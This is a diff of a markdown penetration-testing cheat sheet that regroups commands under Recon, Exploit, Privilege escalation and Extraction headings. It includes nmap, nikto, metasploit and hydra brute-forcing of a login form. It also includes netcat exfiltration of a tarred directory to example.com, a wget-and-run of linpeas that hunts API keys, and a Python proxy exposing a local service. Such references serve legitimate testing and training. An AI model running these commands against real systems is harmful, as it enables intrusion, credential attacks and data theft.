@@ -2,7 +2,7 @@
 ```bash
 sudo nano /etc/hosts
 ```
-
+# Recon
 ## Network scan with`nmap`:
 ```bash
 nmap -v -sV -O -A --top-ports 1000 -oN nmap_output.txt example.com
@@ -22,7 +22,7 @@ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-11000
 ```bash
 nikto -h example.com -p 80 -o nikto_output.txt
 ```
-
+# Exploit
 ## Exploit with `metasploit`:
 ```bash
 msfconsole
@@ -67,42 +67,6 @@ if ($socket) {
     fclose($socket);
 }
 ?>
-```
-
-## Python proxy
-```bash
-import http.server
-import socketserver
-import requests
-
-# Configuration
-HOST = "0.0.0.0"  # Listen on all interfaces
-PORT = 4444        # Public-facing port
-TARGET_URL = "http://127.0.0.1:8080"  # Target service URL (local service)
-
-class ProxyHandler(http.server.SimpleHTTPRequestHandler):
-    def do_GET(self):
-        # Forward GET request to local service
-        response = requests.get(f"{TARGET_URL}{self.path}")
-        self.send_response(response.status_code)
-        self.send_header("Content-type", response.headers.get("Content-type", "text/html"))
-        self.end_headers()
-        self.wfile.write(response.content)
-
-    def do_POST(self):
-        # Forward POST request to local service
-        content_length = int(self.headers['Content-Length'])
-        post_data = self.rfile.read(content_length)
-        response = requests.post(f"{TARGET_URL}{self.path}", data=post_data, headers=self.headers)
-        self.send_response(response.status_code)
-        self.send_header("Content-type", response.headers.get("Content-type", "text/html"))
-        self.end_headers()
-        self.wfile.write(response.content)
-
-# Create an HTTP server and bind it to a public-facing IP address
-with socketserver.TCPServer((HOST, PORT), ProxyHandler) as httpd:
-    print(f"Serving on {HOST}:{PORT}, proxying to {TARGET_URL}")
-    httpd.serve_forever()
 ```
 
 ## XSS/CSRF attack
@@ -265,27 +229,7 @@ sudo hydra -v -V -d -l admin -P /usr/share/wordlists/seclists/Passwords/Leaked-D
 sudo hydra -v -V -l admin -P /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt -o hydra_output.txt example.com http-post-form "/login:username=^USER^&password=^PASS^=:F=Bad"
 ```
 
-## Send directory with `netcat`
-### Sender:
-```bash
-tar -czf directory.tar.gz ./directory
-cat directory.tar.gz | nc example.com 1234
-```
-### Receiver:
-```bash
-nc -l -p 1234 > directory.tar.gz
-```
-
-## Archive
-### Compress:
-```bash
-tar -czvf archive.tar.gz /path/to/directory_or_file
-```
-### Extract:
-```bash
-tar -xzvf archive.tar.gz -C /path/to/extract
-```
-
+# Privilege escalation
 ## Privilege escalation with `linpeas`
 ### Serve:
 ```bash
@@ -300,6 +244,64 @@ cd /tmp
 wget x.x.x.x:8080/linpeas.sh
 chmod +x linpeas.sh
 ./linpeas.sh -q -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,network_information,users_information,software_information,interesting_perms_files,interesting_files,api_keys_regex
+```
+
+# Extraction
+## Send directory with `netcat`
+### Sender:
+```bash
+tar -czf directory.tar.gz ./directory
+cat directory.tar.gz | nc example.com 1234
+```
+### Receiver:
+```bash
+nc -l -p 1234 > directory.tar.gz
+```
+
+## Archive manipulation with `tar`
+### Compress:
+```bash
+tar -czvf archive.tar.gz /path/to/directory_or_file
+```
+### Extract:
+```bash
+tar -xzvf archive.tar.gz -C /path/to/extract
+```
+
+## Python proxy
+```bash
+import http.server
+import socketserver
+import requests
+
+# Configuration
+HOST = "0.0.0.0"  # Listen on all interfaces
+PORT = 4444        # Public-facing port
+TARGET_URL = "http://127.0.0.1:8080"  # Target service URL (local service)
+
+class ProxyHandler(http.server.SimpleHTTPRequestHandler):
+    def do_GET(self):
+        # Forward GET request to local service
+        response = requests.get(f"{TARGET_URL}{self.path}")
+        self.send_response(response.status_code)
+        self.send_header("Content-type", response.headers.get("Content-type", "text/html"))
+        self.end_headers()
+        self.wfile.write(response.content)
+
+    def do_POST(self):
+        # Forward POST request to local service
+        content_length = int(self.headers['Content-Length'])
+        post_data = self.rfile.read(content_length)
+        response = requests.post(f"{TARGET_URL}{self.path}", data=post_data, headers=self.headers)
+        self.send_response(response.status_code)
+        self.send_header("Content-type", response.headers.get("Content-type", "text/html"))
+        self.end_headers()
+        self.wfile.write(response.content)
+
+# Create an HTTP server and bind it to a public-facing IP address
+with socketserver.TCPServer((HOST, PORT), ProxyHandler) as httpd:
+    print(f"Serving on {HOST}:{PORT}, proxying to {TARGET_URL}")
+    httpd.serve_forever()
 ```
 
 ## Crack hash with hashcat
